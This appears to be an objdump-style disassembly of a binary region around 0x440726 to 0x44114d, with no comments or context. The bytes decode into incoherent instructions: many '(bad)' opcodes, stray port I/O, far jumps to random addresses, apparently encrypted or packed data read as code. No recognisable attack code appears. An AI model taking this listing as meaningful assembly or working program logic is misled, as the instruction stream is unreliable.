  440726:	and    eax,0x24f20c30
  44072b:	sub    BYTE PTR [ebx],0x7
  44072e:	mov    ?,WORD PTR [edi-0x4567f96d]
  440734:	add    bh,BYTE PTR [esi-0x32]
  440737:	out    0xbe,eax
  440739:	mov    BYTE PTR [ecx],bh
  44073b:	in     eax,0xf2
  44073d:	icebp  
  44073e:	jle    0x44074b
  440740:	pop    esi
  440741:	inc    eax
  440742:	stc    
  440743:	sub    DWORD PTR [esp+esi*1-0xc],esi
  440747:	in     eax,0xda
  440749:	ja     0x44075e
  44074b:	daa    
  44074c:	push   esp
  44074d:	clc    
  44074e:	pop    esi
  44074f:	sti    
  440750:	movq   mm3,mm5
  440753:	ins    BYTE PTR es:[edi],dx
  440754:	in     al,dx
  440755:	lods   al,BYTE PTR ds:[esi]
  440756:	jp     0x44073d
  440758:	mov    edx,0xb7b90f1
  44075d:	icebp  
  44075e:	(bad)  
  44075f:	in     eax,0x5c
  440761:	xchg   edi,eax
  440762:	xor    ebp,esp
  440764:	mov    ds:0x6c7343f1,al
  440769:	clc    
  44076a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44076b:	in     eax,0x92
  44076d:	fsubr  QWORD PTR [ebx+0x18f18ad4]
  440773:	mov    esp,0x6ccd86eb
  440778:	out    0x84,al
  44077a:	push   eax
  44077b:	in     eax,0x64
  44077d:	xchg   ecx,esi
  44077f:	in     al,0x6a
  440781:	icebp  
  440782:	fnstsw WORD PTR [eax+0x6c]
  440785:	sub    BYTE PTR [eax],al
	...
  4407a3:	add    BYTE PTR [ebp+eiz*8+0x5a],dh
  4407a7:	jg     0x44073f
  4407a9:	in     al,dx
  4407aa:	push   ecx
  4407ab:	icebp  
  4407ac:	fcomp  DWORD PTR fs:[edi]
  4407af:	loopne 0x440805
  4407b1:	in     eax,0x66
  4407b3:	enter  0x7b09,0x27
  4407b7:	js     0x440801
  4407b9:	add    BYTE PTR [eax],0x22
  4407bc:	cmp    al,0x7d
  4407be:	mov    ebx,0xf9e73df5
  4407c3:	adc    BYTE PTR [eax-0x5616061b],bl
  4407c9:	js     0x4407ef
  4407cb:	push   ss
  4407cc:	sbb    al,0xe7
  4407ce:	dec    edi
  4407cf:	pop    esp
  4407d0:	sub    ah,0xfa
  4407d3:	push   es
  4407d4:	sbb    al,0x36
  4407d6:	call   0xfa2af1e4
  4407db:	(bad)  
  4407dc:	sti    
  4407dd:	jp     0x4407a7
  4407df:	push   0xffffffc5
  4407e1:	test   DWORD PTR [edi+esi*4],0x54e44177
  4407e8:	adc    BYTE PTR [ebx-0x3b],ah
  4407eb:	(bad)  
  4407ec:	popa   
  4407ed:	xchg   ecx,eax
  4407ee:	and    al,0xce
  4407f0:	fucom  st(6)
  4407f2:	push   ecx
  4407f3:	pop    ds
  4407f4:	cmp    DWORD PTR [esi],esi
  4407f6:	mov    esp,DWORD PTR [edx+eax*8-0x17]
  4407fa:	stc    
  4407fb:	mov    dh,0x5e
  4407fd:	jge    0x44087a
  4407ff:	(bad)  
  440800:	(bad)  
  440801:	xchg   ecx,eax
  440802:	sub    al,0xe9
  440804:	push   cs
  440805:	arpl   sp,ax
  440807:	cmc    
	...
  440824:	add    BYTE PTR [eax],al
  440826:	xchg   ebx,eax
  440827:	mov    edi,0xba89ea74
  44082c:	stc    
  44082d:	bound  edx,QWORD PTR [ebx-0x627906e5]
  440833:	js     0x440880
  440835:	jge    0x440816
  440837:	js     0x4407c4
  440839:	jge    0x4408b7
  44083b:	out    0xf9,al
  44083d:	add    DWORD PTR [ebp-0x26],0xbb8966f9
  440844:	add    al,0x64
  440846:	dec    esi
  440847:	imul   edi,ebp,0x69
  44084a:	mov    eax,ds:0x326485e6
  44084f:	out    0xf9,eax
  440851:	add    bl,cl
  440853:	gs dec ebp
  440855:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440857:	gs test esp,esi
  44085a:	cli    
  44085b:	out    dx,eax
  44085c:	imul   eax
  44085e:	ins    BYTE PTR es:[edi],dx
  44085f:	ret    
  440860:	idiv   edi
  440862:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440863:	mov    esp,0x6cf48504
  440868:	sti    
  440869:	sub    bh,0xef
  44086c:	test   DWORD PTR [ebp+0x0],eax
  44086f:	push   ecx
  440870:	add    DWORD PTR [ebp-0x810c0],0x79
  440877:	(bad)  
  440878:	hlt    
  440879:	(bad)  
  44087a:	sti    
  44087b:	shr    eax,cl
  44087d:	sub    DWORD PTR [edi],ecx
  44087f:	lock test DWORD PTR [ebx-0x3f830760],0xcb7aff40
	...
  4408a6:	add    BYTE PTR [eax],al
  4408a8:	mov    ebx,0xcb247d67
  4408ad:	shl    edi,cl
  4408af:	lea    ebx,[ecx]
  4408b1:	lock dec ecx
  4408b3:	lea    edi,[ecx]
  4408b5:	call   0xc4c008b0
  4408ba:	add    ch,bl
  4408bc:	imul   edx,ebx,0x7b
  4408bf:	les    esp,FWORD PTR [eax-0x488b3f88]
  4408c5:	jle    0x44088a
  4408c7:	jmp    FWORD PTR [edi]
  4408c9:	dec    ecx
  4408ca:	cld    
  4408cb:	(bad)  
  4408cc:	icebp  
  4408cd:	out    dx,eax
  4408ce:	push   eax
  4408cf:	mov    esp,DWORD PTR [ecx]
  4408d1:	sbb    bh,dh
  4408d3:	dec    DWORD PTR [ebx]
  4408d5:	add    DWORD PTR [ebp-0x82d050c],0xf71fe189
  4408df:	(bad)  
  4408e0:	jmp    0x440946
  4408e2:	mov    ch,0x30
  4408e4:	retf   
  4408e5:	shl    bh,cl
  4408e7:	call   0xfa1a35f9
  4408ec:	pop    edx
  4408ed:	push   esi
  4408ee:	enter  0x8804,0x19
  4408f2:	js     0x4408f1
  4408f4:	(bad)  
  4408f5:	cs jmp 0x2d70d180
  4408fb:	(bad)  
  4408fc:	neg    BYTE PTR [ebx+0x20]
  4408ff:	stc    
  440900:	xor    bl,BYTE PTR [edx]
  440902:	ja     0x440912
  440904:	out    0x53,al
  440906:	xor    al,0xf9
  440908:	and    cl,BYTE PTR [edx]
  44090a:	ja     0x440912
	...
  440928:	add    BYTE PTR [eax],al
  44092a:	aam    0x73
  44092c:	icebp  
  44092d:	jae    0x440937
  44092f:	shl    BYTE PTR [eax-0x10],0x81
  440933:	fsub   QWORD PTR [esi-0x1515fd69]
  440939:	test   DWORD PTR [eax-0xd061544],edx
  44093f:	imul   eax,DWORD PTR [eax-0x4],0x3c
  440943:	push   esp
  440944:	xor    ah,0xe3
  440947:	leave  
  440948:	jmp    0x8ef9:0xeabed4e8
  44094f:	xchg   esp,eax
  440950:	add    DWORD PTR [ebx+0x7cfd2ccd],eax
  440956:	(bad)  
  440957:	test   eax,0x43b95376
  44095c:	dec    eax
  44095d:	cld    
  44095e:	pop    ebp
  44095f:	outs   dx,BYTE PTR ds:[esi]
  440960:	mov    BYTE PTR [edx+ebp*4],ah
  440963:	sub    edx,0xeb84908b
  440969:	stc    
  44096a:	call   0xea79:0x9264985f
  440971:	xchg   eax,ecx
  440973:	adc    cl,ch
  440975:	stc    
  440976:	add    BYTE PTR [eax+0x517ae6b6],0x7e
  44097d:	les    ecx,FWORD PTR [ecx]
  44097f:	add    BYTE PTR [ebx+eax*8-0x1f],ch
  440983:	(bad)  
  440984:	gs mov edx,0xefa47664
  44098a:	nop
  44098b:	jl     0x440990
  44098d:	out    dx,eax
	...
  4409aa:	add    BYTE PTR [eax],al
  4409ac:	push   esp
  4409ad:	loop   0x440a23
  4409af:	cwde   
  4409b0:	add    ebx,esp
  4409b2:	cmp    ch,dh
  4409b4:	mov    dh,BYTE PTR [ebx+eax*8-0x12]
  4409b8:	xor    al,0xe2
  4409ba:	xchg   ebp,eax
  4409bb:	add    BYTE PTR [esi+0x24ee21eb],0x78
  4409c2:	pop    esp
  4409c3:	jae    0x4409e9
  4409c5:	loop   0x4409d9
  4409c7:	fninit 
  4409c9:	aad    0xa
  4409cb:	out    dx,al
  4409cc:	nop
  4409cd:	mov    ebx,0x6ccd88eb
  4409d2:	out    0x82,al
  4409d4:	enter  0x5ee1,0x98
  4409d8:	imul   esp,ecx,0xa388edea
  4409de:	dec    ebx
  4409df:	in     eax,dx
  4409e0:	in     al,0xe1
  4409e2:	outs   dx,BYTE PTR ds:[esi]
  4409e3:	xchg   DWORD PTR [ebp-0x1f],ebx
  4409e6:	shr    ch,cl
  4409e8:	nop
  4409e9:	mov    dh,0xe6
  4409eb:	mov    esp,0xed4f7b00
  4409f0:	(bad)  
  4409f4:	xor    esi,ecx
  4409f6:	pop    ebp
  4409f7:	inc    edi
  4409f8:	mov    cl,0x69
  4409fa:	jecxz  0x440a24
  4409fc:	jb     0x440a6c
  4409fe:	jmp    0xc069dc33
  440a03:	js     0x4409f2
  440a05:	je     0x440a73
  440a07:	sub    BYTE PTR [ecx+eiz*8+0x1086798a],dl
  440a0e:	sub    ch,0x0
	...
  440a2d:	add    BYTE PTR [eax+edx*2-0x76112e8],al
  440a34:	push   DWORD PTR [ebp+0x68]
  440a37:	out    0x7d,eax
  440a39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440a3a:	jno    0x440a84
  440a3c:	pop    edx
  440a3d:	sbb    dl,BYTE PTR [ecx+0x4b]
  440a40:	test   DWORD PTR [edx+edx*8-0x5e],eax
  440a44:	test   DWORD PTR [ecx],esi
  440a46:	hlt    
  440a47:	leave  
  440a48:	test   DWORD PTR [edi],esi
  440a4a:	add    al,0x8d
  440a4c:	jo     0x440a94
  440a4e:	cmp    bh,ah
  440a50:	and    eax,0x688d141e
  440a55:	ss sub bh,ah
  440a58:	push   0x939
  440a5d:	xchg   ebx,eax
  440a5e:	rdtsc  
  440a60:	xchg   DWORD PTR [ebp+ebx*8-0x1a],edi
  440a64:	stc    
  440a65:	push   ss
  440a66:	xchg   esi,eax
  440a67:	mov    WORD PTR [eax+0xe],es
  440a6a:	and    bh,ah
  440a6c:	xchg   DWORD PTR [ebp+ebx*2-0x19],ebp
  440a70:	stc    
  440a71:	inc    BYTE PTR [edi-0x16099f53]
  440a77:	out    0x87,al
  440a79:	pushf  
  440a7a:	fidivr DWORD PTR [eax+0x4b]
  440a7d:	sar    ecx,0xc
  440a80:	sbb    al,0xad
  440a82:	dec    ebp
  440a83:	add    BYTE PTR [ebp+0xcbb8db1],al
  440a89:	lds    ebp,FWORD PTR fs:[ebx+0x13]
  440a8d:	cmp    dl,0xff
  440a90:	(bad)  
  440a91:	call   0x440a96
	...
  440aae:	add    BYTE PTR [eax],al
  440ab0:	inc    ebx
  440ab1:	lods   eax,DWORD PTR ds:[esi]
  440ab2:	hlt    
  440ab3:	mov    bh,0xa9
  440ab5:	out    0x85,al
  440ab7:	mov    dl,0x5d
  440ab9:	shl    DWORD PTR [ebx-0x613226f],cl
  440abf:	sahf   
  440ac0:	push   ecx
  440ac1:	inc    esi
  440ac2:	test   DWORD PTR [edx+0x2ce37b45],ebp
  440ac8:	int3   
  440ac9:	mov    bl,0xcc
  440acb:	add    al,al
  440acd:	mov    al,ds:0xa0b0cccc
  440ad2:	int3   
  440ad3:	int3   
  440ad4:	sbb    DWORD PTR [edi-0x14],esp
  440ad7:	xor    eax,0x0
  440ada:	dec    esi
  440adb:	mov    ecx,DWORD PTR [ecx-0x20]
  440ade:	sub    al,0xc0
  440ae0:	das    
  440ae1:	in     al,dx
  440ae2:	je     0x440b11
  440ae4:	fwait
  440ae5:	xchg   ebp,eax
  440ae6:	or     BYTE PTR [eax],al
  440ae8:	fs cld 
  440aea:	test   BYTE PTR [ebp+0x28],bh
  440aed:	lock popf 
  440aef:	mov    DWORD PTR [ecx-0x2c],ebp
  440af2:	add    DWORD PTR [ebp+0x0],0x94083d68
  440af9:	xchg   esp,eax
  440afa:	stc    
  440afb:	push   DWORD PTR [esp+edi*8]
  440afe:	test   BYTE PTR [ebp-0x28],dl
  440b01:	les    esi,FWORD PTR [esi-0x5]
  440b04:	add    edx,esp
  440b06:	jnp    0x440acc
  440b08:	sub    BYTE PTR [ebx],dh
  440b0a:	push   esi
  440b0b:	mov    ebx,DWORD PTR [ecx]
  440b0d:	dec    esi
  440b0e:	mov    edx,0x4558f408
  440b13:	or     BYTE PTR [eax],al
	...
  440b31:	add    BYTE PTR [ebp-0x1b000655],dl
  440b37:	add    ebp,DWORD PTR [ebx]
  440b39:	sar    BYTE PTR [edi+eiz*2-0x783c000d],cl
  440b40:	les    eax,FWORD PTR [edx+eiz*1]
  440b43:	pop    edi
  440b44:	fstp   QWORD PTR [ebp-0x5a]
  440b47:	fdiv   st(1),st
  440b49:	retf   
  440b4a:	sbb    BYTE PTR [eax-0x678f3334],0xcc
  440b51:	int3   
  440b52:	sbb    DWORD PTR [edi-0x14],ebx
  440b55:	push   esi
  440b56:	das    
  440b57:	push   ecx
  440b58:	or     BYTE PTR [ebp-0x72f7ae76],al
  440b5e:	jmp    0xab:0xd5d568d
  440b65:	add    BYTE PTR [esi+0xd00e44f],cl
  440b6b:	jmp    0xf74f7f6d
  440b70:	fisttp DWORD PTR [edx-0x7a1aa989]
  440b76:	retf   
  440b77:	cwde   
  440b78:	jp     0x440bc4
  440b7a:	or     DWORD PTR [edx+0x4e],edx
  440b7d:	adc    al,0xbd
  440b7f:	xchg   edi,eax
  440b80:	out    0xce,al
  440b82:	ret    
  440b83:	ret    0xf8fd
  440b86:	clc    
  440b87:	or     BYTE PTR [eax-0x3f95f2c3],bh
  440b8d:	adc    dh,bh
  440b8f:	sub    BYTE PTR [esi+0x5b],al
  440b92:	dec    edi
  440b93:	in     eax,dx
  440b94:	std    
  440b95:	retf   
	...
  440bb2:	add    BYTE PTR [eax],al
  440bb4:	inc    ecx
  440bb5:	std    
  440bb6:	mov    bh,0xcc
  440bb8:	pop    ecx
  440bb9:	adc    eax,0x2d51ccb8
  440bbe:	mov    eax,0x7a9c49cc
  440bc3:	in     al,dx
  440bc4:	mov    ds,ebp
  440bc6:	icebp  
  440bc7:	push   eax
  440bc8:	ds push es
  440bca:	sub    edi,DWORD PTR [ebx+0x25]
  440bcd:	push   ebp
  440bce:	sti    
  440bcf:	mov    dl,BYTE PTR [edx+0x33]
  440bd2:	inc    ebp
  440bd3:	test   eax,ebp
  440bd5:	mov    eax,ebx
  440bd7:	adc    al,0xd
  440bd9:	pop    ds
  440bda:	jns    0x440c4f
  440bdc:	adc    eax,0x574ed22
  440be1:	bound  edi,QWORD PTR [edi]
  440be3:	pusha  
  440be4:	push   es
  440be5:	daa    
  440be6:	pusha  
  440be7:	jae    0x440c01
  440be9:	daa    
  440bea:	lods   al,BYTE PTR ds:[esi]
  440beb:	xchg   esi,eax
  440bec:	ret    0xe69d
  440bef:	pop    ecx
  440bf0:	xchg   bl,cl
  440bf2:	dec    eax
  440bf3:	mov    esi,0xba2ce919
  440bf8:	lods   eax,DWORD PTR ds:[esi]
  440bf9:	jmp    esi
  440bfb:	add    ecx,DWORD PTR ds:0xa551e154
  440c01:	cld    
  440c02:	mov    edx,gs
  440c04:	xchg   esp,eax
  440c05:	mov    WORD PTR [esp+ecx*1],ds
  440c08:	fimul  DWORD PTR [esp+ebx*1+0x248cd3f0]
  440c0f:	call   0xf167f3f1
  440c14:	je     0x440bf4
  440c16:	mov    di,0x0
	...
  440c36:	sbb    DWORD PTR [ebp+0x3e166f27],eax
  440c3c:	lahf   
  440c3d:	mov    WORD PTR [esi+ebx*8+0x52],ss
  440c41:	dec    edx
  440c42:	mov    ah,ah
  440c44:	lods   al,BYTE PTR ds:[esi]
  440c45:	lds    esp,FWORD PTR [ecx]
  440c47:	add    BYTE PTR [esi-0x1900a2a5],dl
  440c4d:	add    esi,DWORD PTR [ebx+0x1eea9a00]
  440c53:	cld    
  440c54:	sbb    al,BYTE PTR [esi+0xd]
  440c57:	mov    edi,DWORD PTR [edi]
  440c59:	xchg   BYTE PTR [ecx+0xb],cl
  440c5c:	fmulp  st(2),st
  440c5e:	mov    eax,ds:0xcd037f42
  440c63:	jmp    esi
  440c65:	pop    ebp
  440c66:	or     dh,BYTE PTR [edi]
  440c68:	add    dl,BYTE PTR [eax]
  440c6a:	and    esp,ecx
  440c6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440c6d:	add    edx,DWORD PTR [eax+0x5e7dfb4b]
  440c73:	fsub   DWORD PTR [eax+0x3e]
  440c76:	cmp    eax,0x8a0c3489
  440c7b:	xor    DWORD PTR [ebx],esi
  440c7d:	jge    0x440cbd
  440c7f:	hlt    
  440c80:	rol    BYTE PTR gs:[ecx],0x87
  440c84:	out    0x7a,al
  440c86:	push   eax
  440c87:	cmp    BYTE PTR [eax+0x6d],dh
  440c8a:	sub    eax,0x92603e87
  440c8f:	jno    0x440c91
  440c91:	mov    eax,ds:0xf2000009
  440c96:	int    0x51
  440c98:	pop    ss
  440c99:	cmp    al,BYTE PTR [eax]
	...
  440cb7:	add    BYTE PTR [edi+edx*8],bh
  440cba:	adc    ecx,ecx
  440cbc:	bound  ebx,QWORD PTR [ebx]
  440cbe:	add    BYTE PTR [edx-0x33],ch
  440cc1:	or     BYTE PTR [ebp+0x2f],dl
  440cc4:	mov    ecx,0x7486f978
  440cc9:	aaa    
  440cca:	test   DWORD PTR [edx+edx*8-0xe16eb63],eax
  440cd1:	inc    eax
  440cd2:	or     al,0x60
  440cd4:	clc    
  440cd5:	inc    edi
  440cd6:	xor    eax,0x8507dd2e
  440cdb:	outs   dx,DWORD PTR ds:[esi]
  440cdc:	aad    0xff
  440cde:	(bad)  
  440cdf:	call   0x9cc914bb
  440ce4:	push   ds
  440ce5:	adc    ecx,ecx
  440ce7:	mov    ebp,0xe6ffbef2
  440cec:	push   cs
  440ced:	add    BYTE PTR [eax],al
  440cef:	bound  ecx,QWORD PTR [edi+0xee90088]
  440cf5:	pop    ebx
  440cf6:	loopne 0x440ce7
  440cf8:	mov    eax,ebp
  440cfa:	(bad)  
  440cfb:	xchg   esp,eax
  440cfc:	or     BYTE PTR [ebx-0x18],bl
  440cff:	jmp    0x440ca3
  440d01:	or     BYTE PTR [ebp+0x1],bh
  440d04:	adc    edx,DWORD PTR [ecx+0x12]
  440d07:	cs push cs
  440d09:	(bad)  
  440d0b:	jmp    0x2e4ef01e
  440d10:	push   cs
  440d11:	fdivp  st(1),st
  440d13:	jmp    0xae46f026
  440d18:	syscall 
  440d1a:	add    cl,ch
	...
  440d38:	add    BYTE PTR [eax],al
  440d3a:	push   cs
  440d3b:	add    DWORD PTR [edx+0xe7d],0x60
  440d42:	cmp    DWORD PTR [eax-0x79],edx
  440d45:	add    BYTE PTR [edi+0x3c],cl
  440d48:	cmp    DWORD PTR [ebx+0x48],0x2f743b59
  440d4f:	push   edi
  440d50:	mov    WORD PTR [eax],es
  440d52:	mov    ah,0x0
  440d54:	or     DWORD PTR [ebx+0x12c],0x89303f1f
  440d5e:	daa    
  440d5f:	lods   eax,DWORD PTR ds:[esi]
  440d60:	add    BYTE PTR [eax],al
  440d62:	je     0x440dbf
  440d64:	mov    esi,0x58cf8d
  440d69:	add    BYTE PTR [ecx+ebp*4+0x3],ah
  440d6d:	add    BYTE PTR [eax+eax*1-0x15],ah
  440d71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440d72:	out    dx,eax
  440d73:	sbb    BYTE PTR [eax-0x77],cl
  440d76:	ffreep st(0)
  440d78:	add    BYTE PTR [eax],al
  440d7a:	fs pop ebx
  440d7c:	dec    eax
  440d7d:	dec    esp
  440d7e:	mul    esi
  440d80:	or     DWORD PTR [ebx+0xf0],0x8b186bbd
  440d8a:	mov    esp,0x24000054
  440d8f:	xor    ecx,0xc
  440d92:	popa   
  440d93:	ss xor edx,edi
  440d96:	cmp    DWORD PTR [edx],0xdc83bf
	...
  440dbc:	and    eax,0x6f000000
  440dc1:	push   edi
  440dc2:	cwde   
  440dc3:	add    ah,dh
  440dc5:	inc    DWORD PTR [eax-0x6fa373b5]
  440dcb:	pushf  
  440dcc:	in     al,0xff
  440dce:	dec    DWORD PTR [eax-0x777c9c79]
  440dd4:	xchg   esp,eax
  440dd5:	add    al,0x0
  440dd7:	add    BYTE PTR [ebp+0x57],bl
  440dda:	add    BYTE PTR [eax],0xd
  440ddd:	jmp    0x85e192df
  440de2:	add    al,0x0
  440de4:	or     eax,0x84fc374e
  440de9:	add    BYTE PTR ss:[eax],0xd
  440ded:	jmp    0x6152dc20
  440df2:	int3   
  440df3:	add    BYTE PTR ds:0xb9900ee9,cl
  440df9:	jmp    0xa8d30dfb
  440dfe:	add    cl,BYTE PTR ds:0x8656062
  440e04:	xchg   esp,eax
  440e05:	push   cs
  440e06:	inc    esp
  440e07:	xchg   esi,ebx
  440e09:	and    al,0x7b
  440e0b:	cwde   
  440e0c:	ins    DWORD PTR es:[edi],dx
  440e0d:	jmp    0x600b0e0f
  440e12:	lods   al,BYTE PTR ds:[esi]
  440e13:	in     al,0xd
  440e15:	jmp    0x29626817
  440e1a:	inc    ecx
  440e1b:	test   DWORD PTR [eax-0x6c],ebp
  440e1e:	mov    edi,0x14
	...
  440e3b:	add    BYTE PTR [eax],al
  440e3d:	add    BYTE PTR ds:0xb808eb66,cl
  440e43:	pop    ebp
  440e44:	and    eax,0x7531c0d1
  440e49:	adc    edx,DWORD PTR [ecx]
  440e4b:	and    eax,0xd0b7003d
  440e50:	jl     0x440e9f
  440e52:	jmp    0xcf10329e
  440e57:	call   0xa8df37b1
  440e5c:	std    
  440e5d:	xchg   BYTE PTR [esi-0x3f],cl
  440e60:	js     0x440e9f
  440e62:	or     DWORD PTR [edi-0xc],ebp
  440e65:	push   eax
  440e66:	test   BYTE PTR [ebp+0x11],bh
  440e69:	xchg   DWORD PTR ds:0xf5086560,esi
  440e6f:	add    BYTE PTR [eax+eax*1],dl
  440e72:	or     eax,0x20f36e00
  440e77:	rcl    DWORD PTR [edi+esi*8-0x77],cl
  440e7b:	inc    esp
  440e7c:	fistp  QWORD PTR [esi+0x3df4808]
  440e82:	or     eax,0xb44ed000
  440e87:	fidivr DWORD PTR [edx-0x2324a3ae]
  440e8d:	and    ebx,ecx
  440e8f:	ds out 0x82,eax
  440e92:	leave  
  440e93:	pop    es
  440e94:	ds jnp 0x440e66
  440e97:	cmp    DWORD PTR [edx],edi
  440e99:	jnp    0x440e49
  440e9b:	cmp    al,0xa5
  440e9d:	prefetchw (bad)
  440e9e:	or     eax,0xb79bcc
	...
  440ebf:	add    BYTE PTR [ecx-0x35],dl
  440ec2:	mov    bl,0xb7
  440ec4:	dec    ecx
  440ec5:	retf   
  440ec6:	stos   DWORD PTR es:[edi],eax
  440ec7:	mov    bh,0x41
  440ec9:	retf   
  440eca:	sbb    al,0x7b
  440ecc:	jns    0x440e54
  440ece:	and    al,0xf8
  440ed0:	mov    DWORD PTR [edi+ebp*8+0x53],ecx
  440ed4:	repz dec esp
  440ed7:	add    ebp,ebx
  440ed9:	push   DWORD PTR [edi+0x4adca3db]
  440edf:	out    0xe6,al
  440ee1:	mov    ebp,0xcb4903ef
  440ee6:	sub    esi,DWORD PTR [edi+0x7a9ccb41]
  440eec:	cmp    DWORD PTR [esi],ebp
  440eee:	xchg   edx,eax
  440eef:	jp     0x440e97
  440ef1:	pop    es
  440ef2:	sub    al,BYTE PTR [ebx]
  440ef4:	or     eax,0x8803e700
  440ef9:	mov    ch,0x2a
  440efb:	dec    BYTE PTR [edx]
  440efd:	(bad)  
  440eff:	add    ecx,DWORD PTR [ebp-0x33b91923]
  440f05:	add    ah,bh
  440f07:	add    ecx,DWORD PTR ds:0xf7690000
  440f0d:	fld    st(2)
  440f0f:	call   0xe9440f22
  440f14:	inc    ebp
  440f15:	dec    ebp
  440f16:	adc    al,0xa6
  440f18:	push   cs
  440f19:	add    BYTE PTR [eax],al
  440f1b:	jmp    0xea44ceae
  440f20:	push   cs
  440f21:	add    BYTE PTR [eax],al
  440f23:	scas   al,BYTE PTR es:[edi]
	...
  440f40:	add    BYTE PTR [eax],al
  440f42:	mov    ebx,0xee9f9da
  440f47:	xor    eax,0x4cfbfbd
  440f4c:	je     0x440f2d
  440f4e:	popa   
  440f4f:	fyl2xp1 
  440f51:	jmp    0xea05cf64
  440f56:	or     eax,0xd3e90000
  440f5b:	call   0xae0c:0x4d81abf2
  440f62:	push   cs
  440f63:	add    BYTE PTR [eax],al
  440f65:	jmp    0xeb44ceb8
  440f6a:	push   cs
  440f6b:	add    BYTE PTR [eax],al
  440f6d:	or     al,0x4c
  440f6f:	int3   
  440f70:	int3   
  440f71:	xor    eax,0x2dcccc95
  440f76:	xchg   ebp,eax
  440f77:	int3   
  440f78:	int3   
  440f79:	sbb    dl,BYTE PTR [ecx+0x7d]
  440f7c:	stc    
  440f7d:	aad    0xfe
  440f7f:	pop    edx
  440f80:	stc    
  440f81:	inc    esi
  440f82:	mov    ebp,0xd4974d22
  440f87:	pop    es
  440f88:	sub    eax,0x4ed8c712
  440f8d:	cs adc bh,ah
  440f90:	retf   
  440f91:	stos   BYTE PTR es:[edi],al
  440f92:	push   cs
  440f93:	xor    eax,0x6a
  440f96:	dec    ebp
  440f97:	or     al,0x83
  440f99:	pop    ds
  440f9a:	jp     0x440fa8
  440f9c:	push   ecx
  440f9d:	push   cs
  440f9e:	adc    al,BYTE PTR [ecx*1-0x7d035c00]
  440fa5:	mov    BYTE PTR [eax],0x0
	...
  440fc4:	xchg   edx,eax
  440fc5:	inc    edi
  440fc6:	mov    ebx,0x82d88289
  440fcb:	ds xchg edx,eax
  440fcd:	inc    edi
  440fce:	mov    ebx,0xcc90a0cc
  440fd3:	int3   
  440fd4:	mov    al,ds:0x9cccc90
  440fd9:	push   edi
  440fda:	in     al,dx
  440fdb:	mov    edi,ecx
  440fdd:	repz jp 0x440fcc
  440fe0:	aam    0x4a
  440fe2:	dec    edi
  440fe3:	(bad)  
  440fe4:	jmp    0xe9d160d4
  440fe9:	rol    DWORD PTR [ebp+0x45515845],cl
  440fef:	cld    
  440ff0:	mov    bh,0xe3
  440ff2:	call   0xf8278328
  440ff7:	mov    esi,DWORD PTR [ecx]
  440ff9:	fdivr  DWORD PTR [esp+eax*8+0x68]
  440ffd:	pop    ecx
  440ffe:	shl    DWORD PTR [ebx+esi*2+0x57],0x3d
  441003:	cld    
  441004:	jmp    0xef5c84c5
  441009:	dec    ecx
  44100a:	clc    
  44100b:	push   edi
  44100c:	push   es
  44100d:	push   edi
  44100e:	dec    ebp
  44100f:	hlt    
  441010:	xchg   esi,eax
  441011:	push   edi
  441012:	dec    ebp
  441013:	lock fwait
  441015:	cs push eax
  441017:	push   ecx
  441018:	jecxz  0x441023
  44101a:	inc    eax
  44101b:	adc    dh,BYTE PTR [esp+edi*8-0x7e]
  44101f:	clc    
  441020:	fmul   QWORD PTR [edi-0x9]
  441023:	push   ebx
  441025:	inc    ebx
  441026:	push   esi
  441027:	mov    eax,DWORD PTR [eax]
	...
  441045:	add    cl,bl
  441047:	inc    ecx
  441048:	mov    ebx,0xcc9100cc
  44104d:	int3   
  44104e:	loopne 0x440fe0
  441050:	int3   
  441051:	int3   
  441052:	loopne 0x440fe4
  441054:	int3   
  441055:	int3   
  441056:	or     eax,0x5cec7894
  44105b:	(bad)  
  44105c:	js     0x4410d1
  44105e:	or     DWORD PTR [edx-0x2ab77843],ebx
  441064:	jnp    0x441058
  441066:	popa   
  441067:	cwde   
  441068:	js     0x441074
  44106a:	mov    BYTE PTR [eax],ah
  44106c:	imul   esp,DWORD PTR ds:0x4ff81486,0x50e01c80
  441076:	xchg   esi,eax
  441077:	and    al,0xf4
  441079:	dec    ebp
  44107a:	pop    ebp
  44107b:	sbb    ch,bl
  44107d:	adc    edx,DWORD PTR [ecx-0x45]
  441080:	cmp    eax,0x57a98800
  441085:	adc    BYTE PTR [edx+0x4d0d09b4],ch
  44108b:	jmp    0xf4380912
  441090:	add    DWORD PTR ds:0x44650cd,ebp
  441096:	xchg   esi,eax
  441097:	and    al,0xe0
  441099:	pop    edx
  44109a:	xchg   esi,eax
  44109b:	jl     0x4410dc
  44109d:	mov    ebp,0xccd08d49
  4410a2:	inc    ecx
  4410a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4410a4:	ror    ah,1
  4410a6:	pop    ecx
  4410a7:	hlt    
  4410a8:	mov    ah,ch
	...
  4410c6:	add    BYTE PTR [eax],al
  4410c8:	mov    esp,0x97388ee
  4410cd:	cli    
  4410ce:	ret    
  4410cf:	xchg   eax,ecx
  4410d1:	xor    al,0x87
  4410d3:	repnz shl edi,0x88
  4410d7:	or     cl,BYTE PTR [eax-0x79daa7e0]
  4410dd:	je     0x4410d0
  4410df:	dec    edi
  4410e0:	sbb    BYTE PTR [ecx+ebx*8-0x125b69b0],0x4d
  4410e8:	mov    ebp,0xc913de77
  4410ed:	push   esp
  4410ef:	inc    ebx
  4410f0:	or     eax,0x1d59277d
  4410f5:	xlat   BYTE PTR ds:[ebx]
  4410f6:	cld    
  4410f7:	movups xmm0,XMMWORD PTR [eax-0x19]
  4410fb:	xchg   ch,dh
  4410fd:	sbb    eax,0xc020057c
  441102:	jo     0x44114e
  441104:	adc    DWORD PTR [ebx-0x74b82054],ecx
  44110a:	add    al,0x41
  44110c:	cwde   
  44110d:	ret    
  44110e:	mov    bl,0xcf
  441110:	rol    ebx,0xab
  441113:	iret   
  441114:	fld    st(3)
  441116:	cmp    al,0x8f
  441118:	mov    cl,0x82
  44111a:	mov    ebx,0x3c8b5f0b
  44111f:	adc    BYTE PTR [ebx+edx*1-0x46],bl
  441123:	xchg   ch,dl
  441125:	(bad)  
  441126:	data16 int 0xa4
  441129:	sbb    dh,BYTE PTR [edx+0x57]
	...
  441147:	add    BYTE PTR [eax],al
  441149:	add    BYTE PTR [esi-0x75],cl
  44114c:	icebp  
  44114d:	push   ds
